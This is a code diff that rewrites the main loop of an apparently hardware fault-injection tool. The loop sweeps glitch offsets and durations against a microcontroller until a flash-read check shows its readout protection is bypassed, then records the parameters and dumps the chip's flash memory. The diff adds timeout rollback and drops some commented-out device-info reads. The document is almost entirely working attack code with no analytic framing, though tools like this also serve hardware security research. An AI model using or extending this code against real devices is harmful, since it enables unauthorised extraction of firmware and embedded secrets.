@@ -277,93 +277,59 @@ class Glitcher():
                     f.write(raw_data)
 
         print(fg.li_white + "[*] Dumped memory written to '{}'".format(DUMP_FILE) + fg.rs)
-
+      
     def run(self):
-        """Run the glitching process with the current configuration"""
+            start_time = datetime.now()
+            last_progress_time = start_time
+            offset = self.start_offset
+    
+            while offset < self.end_offset:
+                duration_loop_broken = False
+                for duration in range(self.start_duration, self.end_duration, self.duration_step):
+                    for i in range(self.retries):
+                        now = datetime.now()
+                        if (now - last_progress_time).total_seconds() > 5:
+                            print(fg.red + f"[!] Timeout detected at offset={offset}. Rolling back 5..." + fg.rs)
+                            offset = max(offset - 5, self.start_offset)
+                            duration_loop_broken = True
+                            break
+    
+                        print(fg.li_white + "[*] Set glitch configuration ({},{})".format(offset, duration) + fg.rs)
+                        self.set_glitch_offset(offset)
+                        self.set_glitch_duration(duration)
+                        self.start_glitch()
+                        self.reset_target()
+    
+                        if not self.synchronize():
+                            print(fg.li_red + "[-] Error during sychronisation" + fg.rs)
+                            continue
+    
+                        last_progress_time = datetime.now()
+                        resp = self.send_target_command(READ_FLASH_CHECK, 1, True, b"\r\n")
+    
+                        if resp[0] == b"0":
+                            end_time = datetime.now()
+                            print(ef.bold + fg.green + "[*] Glitching success!\n"
+                                  "    Bypassed the readout protection with the following glitch parameters:\n"
+                                  "        offset   = {}\n        duration = {}\n".format(offset, duration) +
+                                  "    Time to find this glitch: {}".format(end_time - start_time) + fg.rs)
+                            config = "{},{},{},{}\n".format(offset, duration, resp[0], resp[1])
+                            with open(RESULTS_FILE, "a") as f:
+                                f.write(config)
+                            print(fg.li_white + "[*] Dumping the flash memory ..." + fg.rs)
+                            self.dump_memory()
+                            return True
+    
+                        elif resp[0] != b"19":
+                            print(fg.li_red + "[?] Unexpected response: {}".format(resp) + fg.rs)
+    
+                    if duration_loop_broken:
+                        break
+    
+                offset += self.offset_step
+    
+            return False
 
-        # # reset target
-        # self.reset_target()
-        #
-        # # read and show the UID of the target device
-        # print(fg.li_white + "[*] Read target device UID" + fg.rs)
-        # resp = self.send_target_command(b"N", 4, True, b"\r\n")
-        #
-        # if resp[0] == b"0" and len(resp) == 5:
-        #     uid = "{} {} {} {}".format(resp[4].decode("ascii"), resp[3].decode("ascii"), resp[2].decode("ascii"), resp[1].decode("ascii"))
-        # else:
-        #     uid = "<unknown>"
-        #     print(fg.li_red + "[-] Could not read target device UID" + fg.rs)
-        #
-        # # read part identification number
-        # print(fg.li_white + "[*] Read target device part ID" + fg.rs)
-        # resp = self.send_target_command(b"J", 1, True, b"\r\n")
-        #
-        # if resp[0] == b"0":
-        #     part_id = "{}".format(resp[1].decode("ascii"))
-        # else:
-        #     part_id = "<unknown>"
-        #     print(fg.li_red + "[-] Could not read target part ID" + fg.rs)
-        #
-        # # show target device info
-        # print(fg.li_white + "[*] Target device info:\n" +
-        #         "    UID:                        {}\n".format(uid) +
-        #         "    Part identification number: {}".format(part_id))
-        #
-        # print(fg.li_white + "[*] Press <ENTER> to start the glitching process" + fg.rs)
-        # input()
-
-        # measure the time
-        start_time = datetime.now()
-
-        for offset in range(self.start_offset, self.end_offset, self.offset_step):
-            # duration in 10 ns increments
-            for duration in range(self.start_duration, self.end_duration, self.duration_step):
-                # better test more than once
-                for i in range(self.retries):
-
-                    # set glitch config
-                    print(fg.li_white + "[*] Set glitch configuration ({},{})".format(offset, duration) + fg.rs)
-                    self.set_glitch_offset(offset)
-                    self.set_glitch_duration(duration)
-
-                    # start glitch (start the offset counter)
-                    self.start_glitch()
-
-                    # reset target device
-                    self.reset_target()
-
-                    # synchronize with target
-                    if not self.synchronize():
-                        print(fg.li_red + "[-] Error during sychronisation" + fg.rs)
-                        continue
-
-                    # read flash memory address
-                    resp = self.send_target_command(READ_FLASH_CHECK, 1, True, b"\r\n")
-                    print("[DEBUG] Read command response:", resp)
-                    if resp[0] == b"0":
-                        # measure the time again
-                        end_time = datetime.now()
-
-                        print(ef.bold + fg.green + "[*] Glitching success!\n"
-                                "    Bypassed the readout protection with the following glitch parameters:\n"
-                                "        offset   = {}\n        duration = {}\n".format(offset, duration) +
-                                "    Time to find this glitch: {}".format(end_time - start_time) + fg.rs)
-
-                        # save successful glitching configuration in file
-                        config = "{},{},{},{}\n".format(offset, duration, resp[0], resp[1])
-                        with open(RESULTS_FILE, "a") as f:
-                            f.write(config)
-
-                        # dump memory
-                        print(fg.li_white + "[*] Dumping the flash memory ..." + fg.rs)
-                        self.dump_memory()
-
-                        return True
-
-                    elif resp[0] != b"19":
-                        print(fg.li_red + "[?] Unexpected response: {}".format(resp) + fg.rs)
-
-        return False
 
 
 def banner():
